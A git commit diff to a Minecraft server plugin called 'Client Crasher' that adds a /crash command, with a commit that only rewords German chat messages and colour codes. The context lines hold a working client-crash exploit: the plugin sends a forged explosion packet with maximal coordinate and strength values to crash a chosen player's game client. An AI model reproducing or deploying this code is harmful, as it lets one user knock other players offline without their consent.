3244037d5a9d37907b0f2a3fe4d20eea3e34aec6
GhosterAPI <77494104+GhosterAPI@users.noreply.github.com>
2021-07-22 13:00:11 +0200

    Update CrashCommand.java

--- Client Crasher/src/de/ghosterapi/commands/CrashCommand.java
+++ Client Crasher/src/de/ghosterapi/commands/CrashCommand.java
@@ -21,22 +21,22 @@ public class CrashCommand implements CommandExecutor {
         Player p =(Player) sender;
 
         if(!p.hasPermission("ghosterapi.crash")){
-            p.sendMessage("Dazu hast du keine Rechte!");
+            p.sendMessage("§cDu hast keine Berechtigungen für diesen Befehl!");
         } else {
             if(args.length == 0) {
                 p.sendMessage("§cVerwendung: /crash <Spieler>");
             } else if(args.length == 1) {
                 Player target = Bukkit.getServer().getPlayer(args[0]);
                 if(target == null){
-                    p.sendMessage("Der Spieler " + args[0] + " ist nicht online!");
+                    p.sendMessage("§cDer Spieler §e" + args[0] + " §cist nicht online!");
 
                 } else if(target.getName().equalsIgnoreCase(p.getName())){
-                    p.sendMessage("§CDu kannst dich selber nicht crashen!");
+                    p.sendMessage("§cDu kannst dich nicht selber crashen!");
                 } else {
                     ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                             Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
 
-                    p.sendMessage("§2Du hast den Spieler §e" + target.getName() + " §2gecrashed");
+                    p.sendMessage("§aDu hast den Spieler §e" + target.getName() + " §agecrashed");
                 }
             } else {
                 p.sendMessage("§CVerwendung: /crash <Spieler>");
